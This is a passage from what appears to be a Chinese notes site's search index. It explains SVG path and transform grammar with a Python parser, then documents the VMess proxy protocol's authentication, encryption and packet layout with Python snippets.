\u4e0b\u9762\u662f\u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5\uff0c\u90fd\u6bd4\u8f83\u6e05\u6670\uff0c\u5c31\u4e0d\u591a\u89e3\u91ca\u4e86\uff1a \u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5 moveto : ( \" M \" | \" m \" ) wsp * moveto-argument-sequence moveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence closepath : (\" Z \" | \" z \") lineto : ( \" L \" | \" l \" ) wsp * lineto-argument-sequence lineto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence horizontal-lineto : ( \" H \" | \" h \" ) wsp * horizontal-lineto-argument-sequence horizontal-lineto-argument-sequence : coordinate | coordinate comma-wsp ? horizontal-lineto-argument-sequence vertical-lineto : ( \" V \" | \" v \" ) wsp * vertical-lineto-argument-sequence vertical-lineto-argument-sequence : coordinate | coordinate comma-wsp ? vertical-lineto-argument-sequence curveto : ( \" C \" | \" c \" ) wsp * curveto-argument-sequence curveto-argument-sequence : curveto-argument | curveto-argument comma-wsp ? curveto-argument-sequence curveto-argument : coordinate-pair comma-wsp ? coordinate-pair comma-wsp ? coordinate-pair smooth-curveto : ( \" S \" | \" s \" ) wsp * smooth-curveto-argument-sequence smooth-curveto-argument-sequence : smooth-curveto-argument | smooth-curveto-argument comma-wsp ? smooth-curveto-argument-sequence smooth-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair quadratic-bezier-curveto : ( \" Q \" | \" q \" ) wsp * quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument-sequence : quadratic-bezier-curveto-argument | quadratic-bezier-curveto-argument comma-wsp ? quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair smooth-quadratic-bezier-curveto : ( \" T \" | \" t \" ) wsp * smooth-quadratic-bezier-curveto-argument-sequence smooth-quadratic-bezier-curveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? smooth-quadratic-bezier-curveto-argument-sequence elliptical-arc : ( \" A \" | \" a \" ) wsp * elliptical-arc-argument-sequence elliptical-arc-argument-sequence : elliptical-arc-argument | elliptical-arc-argument comma-wsp ? elliptical-arc-argument-sequence elliptical-arc-argument : nonnegative-number comma-wsp ? nonnegative-number comma-wsp ? number comma-wsp flag comma-wsp ? flag comma-wsp ? coordinate-pair flag : \"0\" | \"1\"","title":"EBNF \u8bed\u6cd5"},{"location":"cs/web/svg/#path-string-parser","text":"python \u5199\u7684 path string \u89e3\u6790 class InvalidPathError ( ValueError ): pass class _PathStringParser : # modified from https://github.com/regebro/svg.path/ def __init__ ( self , arguments , rules ): self . args = [] arguments = bytearray ( arguments , \"ascii\" ) self . _strip_array ( arguments ) while arguments : for rule in rules : self . _rule_to_function_map [ rule ]( arguments ) @property def _rule_to_function_map ( self ): return { \"x\" : self . _get_number , \"y\" : self . _get_number , \"a\" : self . _get_number , \"u\" : self . _get_unsigned_number , \"f\" : self . _get_flag , } def _strip_array ( self , arg_array ): # wsp: (0x9, 0x20, 0xA, 0xC, 0xD) with comma 0x2C # https://www.w3.org/TR/SVG/paths.html#PathDataBNF while arg_array and arg_array [ 0 ] in [ 0x9 , 0x20 , 0xA , 0xC , 0xD , 0x2C ]: arg_array [ 0 : 1 ] = b \"\" def _get_number ( self , arg_array ): pattern = re . compile ( rb \"^[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) res = pattern . search ( arg_array ) if not res : raise InvalidPathError ( f \"Expected a number, got ' { arg_array } '\" ) number = float ( res . group ()) self . args . append ( number ) arg_array [ res . start (): res . end ()] = b \"\" self . _strip_array ( arg_array ) return number def _get_unsigned_number ( self , arg_array ): number = self . _get_number ( arg_array ) if number < 0 : raise InvalidPathError ( f \"Expected an unsigned number, got ' { number } '\" ) return number def _get_flag ( self , arg_array ): flag = arg_array [ 0 ] if flag != 48 and flag != 49 : raise InvalidPathError ( f \"Expected a flag (0/1), got ' { chr ( flag ) } '\" ) flag -= 48 self . args . append ( flag ) arg_array [ 0 : 1 ] = b \"\" self . _strip_array ( arg_array ) return flag","title":"path string parser"},{"location":"cs/web/svg/#transform","text":"transform \u662f\u5bf9\u5f53\u524d\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u6574\u4e2a\u5750\u6807\u7cfb\u8fdb\u884c\u7684\u53d8\u6362\uff0c\u4ece\u5de6\u5411\u53f3\u7ed3\u5408 \u6240\u4ee5\u4e5f\u5c31\u53ef\u4ee5\u770b\u505a\u5bf9\u5143\u7d20\u5e94\u7528 transform\uff0c\u4f46\u662f\u4ece\u53f3\u5411\u5de6\u7ed3\u5408 \u6240\u6709\u7684 transform \u90fd\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 3 \u9636\u77e9\u9635\uff1a \\[\\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\] \u4f5c\u7528\u65b9\u5f0f\u662f\uff1a \\[ \\begin{bmatrix} x_\\text{prevCoordSys} \\\\ y_\\text{prevCoordSys} \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\cdot \\begin{bmatrix} x_\\text{newCoordSys} \\\\ y_\\text{newCoordSys} \\\\ 1 \\end{bmatrix} \\] \u5176\u4e2d \\((x_\\text{prevCoordSys}, y_\\text{prevCoordSys})\\) \u8868\u793a\u5728 transform \u524d\u7684\u5750\u6807\u7cfb\u7edf\u4e0b\u7684\u5750\u6807\uff0c\u8fd9\u4e2a 3 \u9636 transform \u7684\u77e9\u9635\u8bb0\u4e3a [a b c d e f] SVG \u4e00\u5171\u652f\u6301\u516d\u79cd transform\uff0c\u4e0b\u9762\u5177\u4f53\u6765\u8bf4\uff1a matrix(a b c d e f): \u65bd\u52a0\u77e9\u9635 [a b c d e f] \u4f5c\u7528 translate(tx [ty]): \u5e73\u79fb\uff0cx \u8f74\u79fb tx\uff0cy \u8f74\u79fb ty\uff0c\u5982\u679c\u6ca1\u6709 ty \u5c31\u662f 0\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 0 1 tx ty] scale(sx [sy]): \u7f29\u653e\uff0cx \u8f74\u7f29\u653e sx \u500d\uff0cy \u8f74\u7f29\u653e sy \u500d\uff0c\u5982\u679c\u6ca1\u6709 sy\uff0c\u5219 sy \u548c sx \u76f8\u7b49\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [sx 0 0 sy 0 0] rotate(angle [cx cy]): \u987a\u65f6\u9488\u65cb\u8f6c angle \u5ea6\uff0c\u4ee5 cx cy \u4e3a\u4e2d\u5fc3\uff0c\u6ca1\u6709\u6307\u5b9a\u5c31\u662f\u539f\u70b9 rotate(angle cx cy) \u76f8\u5f53\u4e8e translate(cx cy) rotate(angle) translate(-cx -cy) rotate(a) \u76f8\u5f53\u4e8e\u77e9\u9635 [cos(a) sin(a) -sin(a) cos(a) 0 0] skewX(angle): x \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 tan(a) 1 0 0] skewY(angle): y \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 tan(a) 0 1 0 0]","title":"transform \u7684\u5904\u7406"},{"location":"cs/web/svg/#ebnf_2","text":"transform \u7684 EBNF \u8bed\u6cd5 transform-list : wsp * transforms ? wsp * transforms : transform | transform comma-wsp + transforms transform : matrix | translate | scale | rotate | skewX | skewY matrix : \" matrix \" wsp * \"(\" wsp * number comma-wsp number comma-wsp number comma-wsp number comma-wsp number comma-wsp number wsp * \")\" translate : \" translate \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" scale : \" scale \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" rotate : \" rotate \" wsp * \"(\" wsp * number ( comma-wsp number comma-wsp number )? wsp * \")\" skewX : \" skewX \" wsp * \"(\" wsp * number wsp * \")\" skewY : \" skewY \" wsp * \"(\" wsp * number wsp * \")\" \u6b63\u5219\u5339\u914d\u5206\u79bb transform: transform_pattern = re . compile ( \"|\" . join ([ x + r \"[^)]*\\)\" for x in transform_names ])) \u91cc\u9762\u7684 number \u90fd\u53ef\u4ee5\u7528\u5f00\u5934\u8bf4\u5230\u7684\u6b63\u5219\u6765\u5339\u914d","title":"EBNF \u8bed\u6cd5"},{"location":"cs/web/svg/#_5","text":"\u9ed8\u8ba4\u6837\u5f0f\uff1a DEFAULT_STYLE = { \"fill\" : \"black\" , \"stroke\" : \"none\" , \"fill-opacity\" : \"1\" , \"stroke-opacity\" : \"1\" , \"stroke-width\" : 0 , } \u5269\u4e0b\u7684\u5c31\u662f\u6309\u7167 css \u7684\u89c4\u5219\u5c42\u53e0\u5c31\u597d\u4e86","title":"\u6837\u5f0f"},{"location":"cs/web/protocol/","text":"\u7f51\u7edc\u534f\u8bae \u00b6 Abstract \u4e00\u4e9b\u4e86\u89e3\u3001\u5b66\u8fc7\u7684\u7f51\u7edc\u534f\u8bae Table of Contents \u00b6 VMess \u534f\u8bae","title":"\u7f51\u7edc\u534f\u8bae"},{"location":"cs/web/protocol/#_1","text":"Abstract \u4e00\u4e9b\u4e86\u89e3\u3001\u5b66\u8fc7\u7684\u7f51\u7edc\u534f\u8bae","title":"\u7f51\u7edc\u534f\u8bae"},{"location":"cs/web/protocol/#table-of-contents","text":"VMess \u534f\u8bae","title":"Table of Contents"},{"location":"cs/web/protocol/vmess/","text":"VMess \u534f\u8bae \u00b6 Abstract VMess \u662f V2Ray \u539f\u521b\u7684\u57fa\u4e8e TCP \u7684\u52a0\u5bc6\u901a\u8baf\u534f\u8bae\uff0c\u5e38\u7528\u4e8e\u4ee3\u7406\u670d\u52a1\u5668\u7684\u901a\u8baf\u4e0a\u3002 \u5728 2022 \u5f3a\u7f51\u676f\u7ebf\u4e0a\u8d5b\u7684\u65f6\u5019\u5b66\u4e86\u8fd9\u4e2a\u534f\u8bae\uff0c\u8bb0\u5f55\u4e00\u4e0b \u53c2\u8003\uff1a VMess \u534f\u8bae - V2Ray \u5f00\u53d1\u8005\u6587\u6863 \uff08\u5168\u662f\u9519\u8bef\uff0c\u4e0d\u8981\u770b\uff09 v2ray/v2ray-core: proxy/vmess worstass/leaf: leaf/src/proxy/vmess VMess \u534f\u8bae - V2Ray \u767d\u8bdd\u6587\u6559\u7a0b VMess \u57fa\u7840 \u00b6 VMess \u901a\u8fc7 uuid \u548c\u65f6\u95f4\u8fdb\u884c\u8ba4\u8bc1\uff0cuuid \u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 16 \u5b57\u8282\u7684\u968f\u673a\u6570\uff0c\u5f62\u5982 43509e50-1164-11ed-861d-0242ac120002\uff084-2-2-2-6 \u5b57\u8282\uff09\uff0c\u51e0\u4e4e\u5b8c\u5168\u968f\u673a\uff0c\u53ef\u4ee5\u901a\u8fc7 https://www.uuidgenerator.net/ \u751f\u6210\u3002\u9700\u8981\u4fdd\u8bc1\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u8bbe\u7f6e\u7684 uuid \u76f8\u540c\uff0c\u5426\u5219\u65e0\u6cd5\u89e3\u5bc6\u3002\u4ee5\u53ca\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u65f6\u95f4\u8bbe\u7f6e\u4e0d\u80fd\u504f\u5dee\u592a\u591a\uff0890 \u79d2\u4ee5\u5185\uff09 VMess \u662f\u4e00\u4e2a\u65e0\u72b6\u6001\u534f\u8bae\uff0c\u5373\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4e0d\u9700\u8981\u63e1\u624b\u5373\u53ef\u76f4\u63a5\u4f20\u8f93\u6570\u636e\uff0c\u6bcf\u4e00\u6b21\u6570\u636e\u4f20\u8f93\u5bf9\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u5176\u5b83\u6570\u636e\u4f20\u8f93\u6ca1\u6709\u5f71\u54cd VMess \u7684\u5ba2\u6237\u7aef\u53d1\u8d77\u4e00\u6b21\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u5224\u65ad\u8be5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u4e00\u4e2a\u5408\u6cd5\u7684\u5ba2\u6237\u7aef\u3002\u5982\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff0c\u5e76\u628a\u83b7\u5f97\u7684\u54cd\u5e94\u53d1\u56de\u7ed9\u5ba2\u6237\u7aef VMess \u4f7f\u7528\u975e\u5bf9\u79f0\u683c\u5f0f\uff0c\u5373\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u8bf7\u6c42\u548c\u670d\u52a1\u5668\u7aef\u7684\u54cd\u5e94\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u683c\u5f0f \u901a\u8baf\u534f\u8bae\u5185\u5bb9 \u00b6 VMess \u662f\u975e\u5bf9\u79f0\u683c\u5f0f\uff0c\u6240\u4ee5\u5206\u5ba2\u6237\u7aef\u8bf7\u6c42\u548c\u670d\u52a1\u7aef\u54cd\u5e94\u4e24\u4e2a\u683c\u5f0f \u5e76\u4e14 VMess \u57fa\u4e8e TCP \u534f\u8bae\uff0c\u4ee5\u4e0b\u7684\u5185\u5bb9\u5747\u5305\u542b\u5728 TCP \u534f\u8bae\u7684\u6570\u636e\u90e8\u5206\u4e2d \u4ee5\u4e0b\u5747\u662f\u4e0d\u4f7f\u7528 AEAD \u7684\u60c5\u51b5\uff0c\u4f7f\u7528 AEAD \u65f6\u4f1a\u6709\u5dee\u522b \u5ba2\u6237\u7aef\u8bf7\u6c42 \u00b6 \u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u5185\u5bb9\u4e3a\uff1a 16 \u5b57\u8282 \u8ba4\u8bc1\u4fe1\u606f \uff08Certification Information\uff09 \u4e0d\u5b9a\u957f\uff08\u4e0b\u9762\u89e3\u91ca\uff09 \u6307\u4ee4\u90e8\u5206 \uff08Instruction Part\uff09\uff0c\u4e5f\u79f0\u8bf7\u6c42\u5934\uff08header\uff09 \u4f59\u4e0b\u7684\u5747\u662f \u6570\u636e\u90e8\u5206 \uff08Data Part\uff09 \u8ba4\u8bc1\u4fe1\u606f \u00b6 \u8ba4\u8bc1\u4fe1\u606f\u7528\u6765\u7ed9\u670d\u52a1\u7aef\u786e\u8ba4 uuid \u4ee5\u53ca\u65f6\u95f4\u662f\u5426\u6b63\u786e\uff0c\u5982\u679c\u4e0d\u6b63\u786e\u5219\u6574\u4e2a\u5305\u90fd\u65e0\u6cd5\u89e3\u7801 \u6574\u4e2a\u8ba4\u8bc1\u4fe1\u606f\u90e8\u5206\u4f7f\u7528 HMAC \u8ba1\u7b97\u54c8\u5e0c \u4f7f\u7528\u7684 hash \u51fd\u6570\u662f md5 \u5bc6\u94a5\u4e3a\u5341\u516d\u5b57\u8282\u7684 uuid\uff08\u5373\u9664\u53bb \"-\" \u540e\u8bfb\u4e3a 16 \u4e2a\u5b57\u8282\u5185\u5bb9 \u4fe1\u606f\u4e3a\u5f53\u524d\u7684 UTC \u65f6\u95f4\uff08Unix \u65f6\u95f4\u6233\uff0c\u7cbe\u786e\u5230\u79d2\uff09\u4e0a\u4e0b\u968f\u673a\u6d6e\u52a8 30 \u79d2\uff0c\u7136\u540e\u8868\u793a\u4e3a 8 \u5b57\u8282\u5927\u7aef\u683c\u5f0f \u5373\u5229\u7528 Python \u5b9e\u73b0\u8ba4\u8bc1\u4fe1\u606f\u7f16\u7801\uff1a import time , hmac , random # \u6807\u51c6\u5e93 uuid = bytes . fromhex ( \"43509e50-1164-11ed-861d-0242ac120002\" . replace ( \"-\" , \"\" )) t = int ( time . time ()) + random . randint ( - 30 , 30 ) cert_info = hmac . new ( uuid , int . to_bytes ( t , 8 , \"big\" ), digestmod = 'md5' ) . digest () \u5728\u8fdb\u884c\u8ba4\u8bc1\u7684\u65f6\u5019\u4f1a\u53d6\u5f53\u524d\u65f6\u95f4\uff0c\u524d\u540e\u5206\u522b\u679a\u4e3e 120 \u79d2\uff0c\u6839\u636e uuid \u8ba1\u7b97 hash \u7136\u540e\u4e0e\u8ba4\u8bc1\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f1a\u5f97\u5230\u552f\u4e00\u7684\u4e00\u4e2a\u65f6\u95f4\u6233 T\uff0c\u5728\u540e\u9762\u6307\u4ee4\u90e8\u5206\u4e5f\u4f1a\u7528\u5230 V2Ray \u670d\u52a1\u7aef\u7684\u4ee3\u7801\u5b9e\u73b0\u662f\u7f13\u5b58\u3001\u66f4\u65b0\u8fd9 240 \u79d2\u5185\u7684\u54c8\u5e0c\u503c\uff0c\u65b9\u4fbf\u8fdb\u884c\u5feb\u901f\u67e5\u627e\uff08 validator.go \uff09 \u6307\u4ee4\u90e8\u5206 \u00b6 \u6307\u4ee4\u90e8\u5206\u6574\u4f53\u662f\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6\u8fc7\u7684 key \u4e3a md5(uuid + b\"c48619fe-8f02-49e0-b9e9-edf763e17e21\") \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0cuuid \u4e3a 16 \u5b57\u8282\uff0c\u540e\u9762\u63a5\u7684\u662f\u56fa\u5b9a\u7684\uff0c\u800c\u4e14\u5e76\u4e14\u4e0d\u662f 16 \u5b57\u8282 uuid \u800c\u662f 36 \u5b57\u8282\uff08\u5b57\u7b26\u4e32\u8f6c bytes\uff0c\u4e00\u4e2a\u5b57\u7b26\u4e00\u4e2a\u5b57\u8282\uff09 iv \u4e3a md5(T * 4) \uff0c\u5176\u4e2d T \u4e3a\u4e0a\u9762\u7528\u4e8e\u8ba1\u7b97 hmac \u54c8\u5e0c\u7684\u65f6\u95f4\u6233\uff088 \u5b57\u8282\u5927\u7aef\uff09 import hashlib from Crypto.Cipher import AES # pycryptodome key = hashlib . md5 ( uuid + b \"c48619fe-8f02-49e0-b9e9-edf763e17e21\" ) . digest () iv = hashlib . md5 ( t * 4 ) . digest () cipher = AES . new ( key = key , mode = AES . MODE_CFB , IV = iv , segment_size = 128 ) inst_part = cipher . encrypt ( inst ) \u672a\u52a0\u5bc6\u7684\u6307\u4ee4\u5185\u5bb9\u4e3a\uff1a \uff08 1 \u5b57\u8282\uff09\u7248\u672c\u53f7 ver\uff1a\u59cb\u7ec8\u4e3a 1 \uff0816 \u5b57\u8282\uff09\u6570\u636e\u90e8\u5206\u52a0\u5bc6 iv\uff1a\u968f\u673a\u751f\u6210\uff0c\u4f9b\u6570\u636e\u90e8\u5206\u52a0\u5bc6\u4f7f\u7528\uff08\u540e\u4e5f\u79f0\u8bf7\u6c42 iv\uff09 \uff0816 \u5b57\u8282\uff09\u6570\u636e\u90e8\u5206\u52a0\u5bc6 key\uff1a\u968f\u673a\u751f\u6210\uff0c\u4f9b\u6570\u636e\u90e8\u5206\u52a0\u5bc6\u4f7f\u7528\uff08\u540e\u4e5f\u79f0\u8bf7\u6c42 key\uff09 \uff08 1 \u5b57\u8282\uff09\u54cd\u5e94\u8ba4\u8bc1 V\uff1a\u968f\u673a\u751f\u6210\uff0c\u7528\u4e8e\u5339\u914d\u54cd\u5e94 \uff08 1 \u5b57\u8282\uff09\u9009\u9879 opt .......S\uff1a\u662f\u5426\u4f7f\u7528\u6807\u51c6\u683c\u5f0f\u6570\u636e\u6d41\uff08\u4e00\u822c\u5747\u4e3a 1\uff09 ......R.\uff1a\u5df2\u5f03\u7528 .....M .. \uff1a\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u662f\u5426\u5f00\u542f mask\uff08\u540e\u9762\u4f1a\u8be6\u7ec6\u89e3\u91ca\uff09 ....P ... \uff1a\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u662f\u5426\u5f00\u542f padding \uff08 1 \u5b57\u8282\uff09P \u4e0e Sec \uff08\u524d 4 bit\uff09\u4f59\u91cf P\uff1a\u5728\u6821\u9a8c\u7801\u524d\u6dfb\u52a0\u7684\u5b57\u8282\u6570 \uff08\u540e 4 bit\uff09\u52a0\u5bc6\u65b9\u5f0f Sec\uff1a\u5bf9\u4e8e\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u4f7f\u7528\u7684\u52a0\u5bc6\u65b9\u5f0f\uff08 \u6b64\u5904\u6587\u6863\u6709\u8bef \uff09 0x1\uff1a\u4f7f\u7528 AES-128-CFB \u7b97\u6cd5\uff08\u5c11\u7528\uff09 0x3\uff1a\u4f7f\u7528 AES-128-GCM \u7b97\u6cd5 0x4\uff1a\u4f7f\u7528 ChaCha20-Poly1305 \u7b97\u6cd5 0x5\uff1a\u4e0d\u52a0\u5bc6\uff08\u5c11\u7528\uff09 \uff08 1 \u5b57\u8282\uff09\u4fdd\u7559\uff0c\u9ed8\u8ba4\u4e3a 0x00 \uff08 1 \u5b57\u8282\uff09\u6307\u4ee4 cmd\uff1a\u4e3a 0x01 \u65f6\u4f7f\u7528 TCP\u3001\u4e3a 0x02 \u65f6\u4f7f\u7528 UDP \uff08 2 \u5b57\u8282\uff09\u7aef\u53e3\u53f7 port\uff1a2 \u5b57\u8282\u5927\u7aef\u683c\u5f0f\u7684\u6574\u578b\u7aef\u53e3\u53f7 \uff08 1 \u5b57\u8282\uff09\u5730\u5740\u7c7b\u578b T\uff1a\u4e3a 0x01 \u5230 0x03 \uff08 ? \u5b57\u8282\uff09\u5730\u5740 A\uff1a \u5f53 T == 0x01 \u65f6\uff1aA \u4e3a 4 \u5b57\u8282 IPv4 \u5730\u5740 \u5f53 T == 0x02 \u65f6\uff1aA \u4e3a 1 \u5b57\u8282\u7684\u957f\u5ea6 L \u540e\u63a5 L \u5b57\u8282\u7684\u57df\u540d \u5f53 T == 0x03 \u65f6\uff1aA \u4e3a 16 \u5b57\u8282 IPv6 \u5730\u5740 \uff08 P \u5b57\u8282\uff09\u968f\u673a\u503c\uff1a\u968f\u673a\u586b\u5145\uff0c\u957f\u5ea6\u7531\u524d\u9762\u7684 P \u51b3\u5b9a \uff08 4 \u5b57\u8282\uff09\u6821\u9a8c\u7801 F\uff1a\u6307\u4ee4\u90e8\u5206\u9664\u6821\u9a8c\u7801\u4ee5\u5916\u6240\u6709\u5185\u5bb9\u7684 fnv1a \u54c8\u5e0c\u503c from fnvhash import fnv1a_32 # pip install fnvhash F = int . to_bytes ( fnv1a_32 ( inst [: 45 + P ]), 4 , \"big\" ) \u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219\u7801\u597d\u6307\u4ee4\u4e4b\u540e\u518d\u7ecf\u8fc7 AES-128-CFB \u52a0\u5bc6\uff0c\u5f97\u5230\u76f8\u540c\u957f\u5ea6\u7684\u5bc6\u6587\uff0c\u5c31\u662f\u6700\u540e\u8981\u653e\u5165\u5305\u4e2d\u7684\u6307\u4ee4\u90e8\u5206 \u89e3\u7801\u65f6\u6839\u636e\u8ba4\u8bc1\u4fe1\u606f\u5f97\u5230\u65f6\u95f4\u6233\u8fdb\u800c\u8ba1\u7b97\u51fa iv\uff0c\u7ecf\u8fc7 AES-128-CFB \u89e3\u5bc6\u5373\u53ef \u6570\u636e\u90e8\u5206 \u00b6 \u6570\u636e\u683c\u5f0f\u5206\u4e3a\u57fa\u7840\u683c\u5f0f\uff08basic format\uff09\u548c\u6807\u51c6\u683c\u5f0f\uff08standard format\uff09\u3002\u5176\u4e2d\u57fa\u7840\u683c\u5f0f\u5df2\u7ecf\u5f03\u7528\uff0c\u4f46\u4e3a\u5411\u540e\u517c\u5bb9\u6240\u4fdd\u7559\uff0c\u4ec5\u652f\u6301\u4e0d\u52a0\u5bc6\u548c AES-128-CFB\uff08Sec \u4e3a 0x1 \u6216 0x5\uff09 \u8fd9\u90e8\u5206\u6587\u6863\u4e5f\u6709\u95ee\u9898 \u57fa\u7840\u683c\u5f0f \u00b6 \u5982\u679c\u6307\u4ee4\u90e8\u5206 opt \u4e2d S \u4e3a 0\uff0c\u5219\u4f7f\u7528\u57fa\u7840\u683c\u5f0f\uff0c\u6570\u636e\u76f4\u63a5\u5199\u5728\u6570\u636e\u90e8\u5206\u4e2d \u5982\u679c Sec == 0x1 \u5219\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6\uff0c\u52a0\u5bc6\u4f7f\u7528\u7684 key \u548c iv \u5728\u6307\u4ee4\u90e8\u5206\u4e2d \u5982\u679c Sec == 0x5 \u5219\u4e0d\u52a0\u5bc6\uff0c\u5373\u76f4\u63a5\u5199\u5165\u660e\u6587 \u6807\u51c6\u683c\u5f0f \u00b6 \u5982\u679c\u6307\u4ee4\u90e8\u5206 opt \u4e2d S \u4e3a 1\uff0c\u5219\u4f7f\u7528\u6807\u51c6\u683c\u5f0f\uff0c\u8fdb\u884c\u5206\u5757\u5199\u5165 \u6bcf\u4e00\u4e2a\u5757\u5305\u542b 2 \u5b57\u8282\u7684\u957f\u5ea6 L\uff0c\u4ee5\u53ca L \u5b57\u8282\u7684\u6570\u636e\u5305\uff0c\u5176\u4e2d\uff1a \u957f\u5ea6 L\uff1a2 \u5b57\u8282\u5927\u7aef\u683c\u5f0f\u7684\u6574\u578b \u5f53 opt \u4e2d M \u4e3a 0 \u65f6\uff0cL \u5c31\u662f\u771f\u5b9e\u503c \u5f53 opt \u4e2d M \u4e3a 1 \u65f6\uff0cL = \u771f\u5b9e\u957f\u5ea6 xor mask\u3002\u8fd9\u91cc\u7684 mask \u5148\u91c7\u7528 Shake128 \u6839\u636e\u8bf7\u6c42 iv\uff08\u5373\u6307\u4ee4\u90e8\u5206\u4e2d\u7684 iv\uff09\u751f\u6210\u4e00\u4e2a RequestMask\uff0c\u7136\u540e\u6bcf\u6b21 mask \u4e3a\u4ece RequestMask \u4e2d\u53d6\u4e24\u4e2a\u5b57\u8282\u4ee5\u5927\u7aef\u5e8f\u8f6c\u4e3a\u6574\u578b\uff0c\u5177\u4f53\u540e\u9762\u4f1a\u8be6\u7ec6\u89e3\u91ca \u6570\u636e\u5305\uff1a\u6839\u636e\u52a0\u5bc6\u65b9\u5f0f\u8fdb\u884c\u52a0\u5bc6\uff0c\u4f20\u8f93\u7ed3\u675f\u65f6\u53d1\u9001\u7a7a\u6570\u636e\u5305\u8868\u793a\u7ed3\u675f\uff0c\u9700\u8981\u8ba1\u7b97\u51fa padding_len\uff08\u540e\u9762\u8be6\u7ec6\u89e3\u91ca\uff09\uff0c\u5e76\u8bb0 l = L - padding_len \u4e0d\u52a0\u5bc6\uff08Sec == 0x5\uff09\uff1a\u76f4\u63a5\u5199\u5165 l \u5b57\u8282\u660e\u6587\uff0c\u540e\u63a5 padding AES-128-CFB\uff08Sec == 0x1\uff09 \u524d 4 \u5b57\u8282\u4e3a\u540e l-4 \u5b57\u8282\u7684 fnv1a \u54c8\u5e0c\uff08\u5927\u7aef\uff09 \u4e2d\u95f4 l-4 \u5b57\u8282\u4e3a AES-128-CFB \u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0ckey \u548c iv \u5747\u662f\u6307\u4ee4\u90e8\u5206\u4e2d\u7684\u8bf7\u6c42 key \u548c\u8bf7\u6c42 iv \u540e\u63a5 padding AES-128-GCM\uff08Sec == 0x3\uff09 \u524d l-16 \u5b57\u8282\uff1aAES-128-GCM \u52a0\u5bc6\u540e\u7684\u5bc6\u6587 key \u4e3a\u6307\u4ee4\u90e8\u5206\u4e2d\u7684\u8bf7\u6c42 key iv \u4e3a 2 \u5b57\u8282\u7684 count \u62fc\u63a5\u4e0a 10 \u5b57\u8282\u7684\u8bf7\u6c42 iv \u7684\u7b2c 3\uff5e12 \u5b57\u8282\uff08requestBodyIV[2:12]\uff09\uff0c\u5176\u4e2d count \u4ece\u7b2c\u4e00\u4e2a\u6570\u636e\u5305 0 \u5f00\u59cb\uff0c\u6bcf\u4e2a\u6570\u636e\u5305\u589e\u52a0 1\uff0c\u7f16\u7801\u4e3a 2 \u5b57\u8282\u5927\u7aef\u683c\u5f0f \u4e2d\u95f4 16 \u5b57\u8282\uff1aAES-128-GCM \u5f97\u5230\u7684\u8ba4\u8bc1\u4fe1\u606f \u540e\u63a5 padding ChaCha20-Poly1305\uff08Sec == 0x4\uff09 \u524d l-16 \u5b57\u8282\uff1aChaCha20-Poly1305 \u52a0\u5bc6\u540e\u7684\u5bc6\u6587 key \u4e3a md5(\u8bf7\u6c42 key) + md5(md5(\u8bf7\u6c42 key)) iv \u540c\u4e0a AES-128-GCM \u4e2d\u95f4 16 \u5b57\u8282\uff1aChaCha20-Poly130 \u5f97\u5230\u7684\u8ba4\u8bc1\u4fe1\u606f \u540e\u63a5 padding \u5173\u4e8e padding \u548c mask \uff1apadding \u957f\u5ea6\u4e0d\u56fa\u5b9a\u4e14\u5185\u5bb9\u968f\u673a\uff0c\u5b83\u548c\u957f\u5ea6\u7684 mask \u4f7f\u7528\u540c\u4e00\u4e2a Shake128 \u751f\u6210\uff0cpadding \u957f\u5ea6\u4e3a\u4ece\u4e2d\u53d6\u4e24\u4e2a\u5b57\u8282\uff0c\u6309\u5927\u7aef\u5e8f\u8f6c\u4e3a\u6574\u578b\uff0c\u7136\u540e\u6a21 64\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u7c7b\uff1a class Mask : def __init__ ( self , nonce : bytes ): # \u6b64\u5904 nonce \u5373\u4e3a iv self . hasher = hashlib . shake_128 ( nonce ) self . buffer = self . hasher . digest ( 60000 ) # \u63d0\u524d\u8ba1\u7b97\u51fa\u8db3\u591f\u7528\u7684\u90e8\u5206 self . 